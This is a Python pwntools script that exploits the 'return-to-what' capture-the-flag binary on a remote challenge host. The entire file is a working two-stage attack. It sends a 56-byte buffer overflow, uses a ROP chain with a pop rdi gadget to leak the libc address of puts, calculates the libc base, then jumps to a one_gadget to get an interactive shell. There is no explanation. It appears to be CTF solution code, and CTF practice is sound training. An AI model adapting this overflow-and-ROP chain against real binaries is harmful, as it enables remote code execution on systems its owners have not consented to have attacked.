from pwn import *

def exploit():
    # p = process("./return-to-what")
    p = remote("chal.duc.tf", 30003)
    binary = ELF("./return-to-what")

    main = binary.symbols['main']
    puts_plt = binary.plt['puts']
    puts_got = binary.got['puts']
    pop_rdi = 0x000000000040122b

    payload = ''
    payload += 'A' * 56
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)

    p.sendline(payload)

    p.recvuntil("to?\n")

    libc_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
    log.info("Libc leak: {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x0809c0
    log.info("Libc base: {}".format(hex(libc_base)))
    one_gadget = libc_base + 0x10a38c
    log.info("One gadget addr: {}".format(hex(one_gadget)))

    payload = ''
    payload += 'A' * 56
    payload += p64(one_gadget)
    
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()